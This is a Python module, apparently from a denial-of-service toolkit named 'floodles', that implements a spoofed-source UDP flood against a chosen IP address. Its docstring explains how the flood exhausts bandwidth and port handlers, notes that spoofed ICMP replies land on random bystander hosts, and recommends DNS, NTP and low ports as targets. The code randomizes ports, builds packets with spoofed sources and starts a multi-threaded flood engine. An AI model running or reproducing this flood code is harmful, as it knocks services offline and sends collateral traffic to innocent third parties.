"""
modules/udp_flood.py - UFOUDP
Volumetric UDP flood. Saturates bandwidth or port handlers.

How it works:
  UDP is stateless. Server must process every incoming datagram to determine
  if a service listens on that port. If not: ICMP port-unreachable is sent back,
  creating additional outbound load on the victim.

  With spoofed IPs: ICMP replies go to random hosts (collatoral).
  Without spoofing: direct bandwidth saturation.

Effective ports to target:
  53  (DNS) -> resolver CPU exhaustion
  123 (NTP) -> similar stateless handling
  1-1024 random -> ICMP unreachable storm on victim
"""

import random
from floodles.core.packet_builder import PacketBuilder
from floodles.core.sender import FloodEngine


def run(
    dst_ip: str,
    dst_port: int = 0,          # 0 = randomize per packet
    payload_size: int = 512,
    threads: int = 8,
    pps_limit: int = 0,
    duration: int = 30,
    spoof: bool = True,
) -> FloodEngine:
    """
    Launch UDP flood.

    Args:
        dst_ip       : Target IP.
        dst_port     : Target port. 0 = randomize (multi-port scan pressure).
        payload_size : UDP payload size in bytes. Max practical ~1400 (MTU safe).
        threads      : Worker count.
        pps_limit    : PPS cap.
        duration     : Duration in seconds.
        spoof        : Randomize source IP.

    Returns:
        FloodEngine instance (already started).
    """
    builder = PacketBuilder()

    def make_packet() -> bytes:
        port = dst_port if dst_port != 0 else random.randint(1, 65535)
        return builder.udp(dst_ip, port, payload_size=payload_size, spoof=spoof)

    engine = FloodEngine(
        packet_fn=make_packet,
        dst_ip=dst_ip,
        threads=threads,
        pps_limit=pps_limit,
        duration=duration,
    )
    engine.start()
    return engine
